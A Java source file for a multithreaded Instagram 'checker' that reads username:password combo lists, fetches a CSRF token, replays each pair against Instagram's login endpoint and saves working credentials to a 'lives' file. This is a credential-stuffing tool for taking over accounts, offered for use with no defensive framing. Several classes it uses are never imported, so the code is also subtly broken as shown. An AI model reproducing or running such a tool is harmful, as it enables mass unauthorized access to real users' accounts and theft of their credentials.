import java.io.*;
import java.net.http.*;
import java.net.URI;
import java.net.http.HttpResponse;
import java.net.http.HttpRequest;
import java.nio.file.*;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.*;
import java.util.regex.*;
import java.util.stream.*;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.select.Elements;

public class InstagramChecker {
    private static final String URL = "https://www.instagram.com/accounts/login/";
    private static final String LOGIN_URL = "https://www.instagram.com/accounts/login/ajax/";
    private static final String COMBO_FILE = "./accounts";
    private static final String LIVE_FILE = "./lives";

    private static final Lock lock = new ReentrantLock();

    public static class Colors {
        public static void info(String msg) {
            lock.lock();
            try {
                System.out.println("\033[34m#\033[0m " + msg);
            } finally {
                lock.unlock();
            }
        }

        public static void correct(String msg) {
            lock.lock();
            try {
                System.out.println("\033[32m+\033[0m " + msg);
            } finally {
                lock.unlock();
            }
        }

        public static void error(String msg) {
            lock.lock();
            try {
                System.out.println("\033[31m-\033[0m " + msg);
            } finally {
                lock.unlock();
            }
        }

        public static void warning(String msg) {
            lock.lock();
            try {
                System.out.println("\033[33m!\033[0m " + msg);
            } finally {
                lock.unlock();
            }
        }
    }

    public static class Save {
        public static String getFirstLine(String filename) {
            lock.lock();
            try {
                return Files.lines(Paths.get(filename + ".txt"), StandardCharsets.UTF_8)
                             .findFirst()
                             .orElse("");
            } catch (IOException e) {
                return "";
            } finally {
                lock.unlock();
            }
        }

        public static void removeFirstLine(String filename) {
            lock.lock();
            try {
                List<String> lines = Files.lines(Paths.get(filename + ".txt"), StandardCharsets.UTF_8)
                                          .collect(Collectors.toList());
                if (!lines.isEmpty()) {
                    lines.remove(0);
                }
                Files.write(Paths.get(filename + ".txt"), lines, StandardCharsets.UTF_8);
            } catch (IOException e) {
                e.printStackTrace();
            } finally {
                lock.unlock();
            }
        }

        public static List<String> getFilepaths(String directory) {
            lock.lock();
            try {
                return Files.walk(Paths.get(directory))
                            .filter(Files::isRegularFile)
                            .map(Path::toString)
                            .collect(Collectors.toList());
            } catch (IOException e) {
                return Collections.emptyList();
            } finally {
                lock.unlock();
            }
        }

        public static void saveToFile(String filename, String textToSave, String place) {
            lock.lock();
            try {
                Path filePath = Paths.get(place + filename + ".txt");
                Files.write(filePath, (textToSave + "\n").getBytes(StandardCharsets.UTF_8), 
                            StandardOpenOption.CREATE, StandardOpenOption.APPEND);
            } catch (IOException e) {
                e.printStackTrace();
            } finally {
                lock.unlock();
            }
        }
    }

    public static int getLen(String file) {
        try {
            return Files.readAllLines(Paths.get(file + ".txt"), StandardCharsets.ISO_8859_1).size();
        } catch (IOException e) {
            return 0;
        }
    }

    public static String[] getValidAccount() {
        while (true) {
            try {
                String infoFile = Save.getFirstLine(COMBO_FILE).trim();
                if (infoFile.contains(":")) {
                    String[] parts = infoFile.split(":");
                    String username = parts[0].trim();
                    String password = parts[1].replaceAll("\\W+", "");
                    Save.removeFirstLine(COMBO_FILE);
                    return new String[]{username, password};
                }
            } catch (Exception e) {
                // Continue
            }
        }
    }

    public static void check() {
        HttpClient client = HttpClient.newHttpClient();
        long timestamp = System.currentTimeMillis() / 1000;
        
        String[] account = getValidAccount();
        String username = account[0];
        String password = account[1];

        HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create(URL))
                .build();

        try {
            HttpResponse<String> initialResponse = client.send(request, HttpResponse.BodyHandlers.ofString());
            Matcher csrfMatcher = Pattern.compile("csrf_token\":\"(.*?)\"").matcher(initialResponse.body());
            String csrfToken = csrfMatcher.find() ? csrfMatcher.group(1) : "";

            HttpRequest loginRequest = HttpRequest.newBuilder()
                    .uri(URI.create(LOGIN_URL))
                    .header("user-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36")
                    .header("referer", "https://www.instagram.com/accounts/login/")
                    .header("x-requested-with", "XMLHttpRequest")
                    .header("x-csrftoken", csrfToken)
                    .POST(HttpRequest.BodyPublishers.ofString(
                            String.format("username=%s&enc_password=#PWD_INSTAGRAM_BROWSER:0:%d:%s&queryParams=%%7B%%7D&optIntoOneTap=false",
                                          username, timestamp, password)))
                    .build();

            HttpResponse<String> loginResponse = client.send(loginRequest, HttpResponse.BodyHandlers.ofString());
            JsonNode jsonResponse = new ObjectMapper().readTree(loginResponse.body());

            if (jsonResponse.path("authenticated").asBoolean()) {
                Colors.correct("Authenticated");
                Save.saveToFile(LIVE_FILE, "Login: " + username + " | Senha: " + password, "./");
            } else if (jsonResponse.path("user").asBoolean()) {
                Colors.info("User exists");
                Save.saveToFile("userlive", "Login: " + username + " | Senha: " + password, "./");
            } else {
                Colors.error("Authentication failed");
                Save.saveToFile("die", "Login: " + username + " | Senha: " + password, "./");
            }
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            int loaded = getLen(COMBO_FILE);
            Colors.correct("Loaded " + loaded + " items.");
            int threadCount = Integer.parseInt(JOptionPane.showInputDialog("Threads: "));
            ExecutorService executor = Executors.newFixedThreadPool(threadCount);
            List<Future<?>> futures = new ArrayList<>();
            for (int i = 0; i < loaded; i++) {
                futures.add(executor.submit(InstagramChecker::check));
            }
            for (Future<?> future : futures) {
                future.get();
            }
            executor.shutdown();
        } catch (Exception e) {
            e.printStackTrace();
        }

        System.out.println("Press ENTER to exit...");
        try {
            System.in.read();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
